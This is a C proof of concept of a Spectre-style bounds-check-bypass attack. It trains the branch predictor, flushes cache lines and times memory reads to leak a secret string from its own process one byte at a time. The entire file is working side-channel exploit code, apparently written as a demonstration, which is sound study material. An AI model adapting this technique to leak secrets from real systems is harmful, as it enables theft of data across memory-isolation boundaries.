#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include <ctype.h>
#include <time.h>

#define N 1000

#define FREQUENCY 6
#define TRAINING  2

#define CACHE_LINES  256
#define CACHE_SLICES 512

#define SECRET_SIZE 45

#define CACHE_THRESHOLD 80

uint8_t trainer[] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
size_t trainer_sz = sizeof(trainer);

uint8_t detector[CACHE_LINES * CACHE_SLICES];

size_t cache_hits[CACHE_LINES];

char const* const secret = "A secret between three is everybodies secret.";

void victim(size_t idx) {
    uint8_t temp;
    if (idx < trainer_sz)
        temp &= detector[trainer[idx] * CACHE_SLICES];
}

void train(size_t malicious_idx, size_t training_idx) {
    size_t idx;
    for (size_t i=0; i < TRAINING; ++i) {
        _mm_clflush(&trainer_sz);

        for (volatile size_t i=0; i < 100; ++i);

        idx = ((i % FREQUENCY) - 1) & ~0xFFFF;
        idx = (idx | (idx >> 16));
        idx = training_idx ^ (idx & (malicious_idx ^ training_idx));

        victim(idx);
    }
}

void readbyte(ssize_t idx, uint8_t value[static 1], ssize_t score[static 1]) {
    uint32_t junk;
    register uint64_t t1, t2;
    ssize_t j, k;
    size_t mix_i;

    for (size_t i=0; i < CACHE_LINES; ++i)
        cache_hits[i] = 0;
    
    for (size_t n=0; n < N; ++n) {
        for (size_t i=0; i < CACHE_LINES; ++i)
            _mm_clflush(&detector[i * CACHE_SLICES]);

        train(idx, n % trainer_sz);

        for (size_t i=0; i < CACHE_LINES; ++i) {           
            mix_i = ((i * 167) + 13) & 0xFF;
                
            t1 = __rdtscp(&junk);
            junk = detector[mix_i * CACHE_SLICES];
            t2 = __rdtscp(&junk);

            if ((t2 - t1) <= CACHE_THRESHOLD && 
                mix_i != trainer[n % trainer_sz])
                ++cache_hits[mix_i];
        }

        j = 0, k = 1;
        if (cache_hits[j] < cache_hits[k])
            k = 0, j = 1;

        for (size_t i=2; i < CACHE_LINES; ++i)
            if (cache_hits[j] < cache_hits[i])
                k = j, j = i;
            else if (cache_hits[k] < cache_hits[i])
                k = i;


        if (cache_hits[j] >= (2 * cache_hits[k] + 5) || 
           (cache_hits[j] == 2 && cache_hits[k] == 0))
			break;
	}

    value[0] = j;
    score[0] = cache_hits[j];
}

int main(int argc, char* argv[argc+1]) {
    uint8_t value;
    ssize_t score;

    for (size_t i=0; i < sizeof(detector); ++i)
        detector[i] = 0;

    ssize_t idx = (size_t) (secret - (char*) trainer);

    for (size_t i=0; i < SECRET_SIZE; ++i) {
		printf("%zd ", idx);
        readbyte(idx++, &value, &score);
		printf("%#02x='%c'\n", value, (isascii(value) ? value : '?'));
	}

    return EXIT_SUCCESS;
}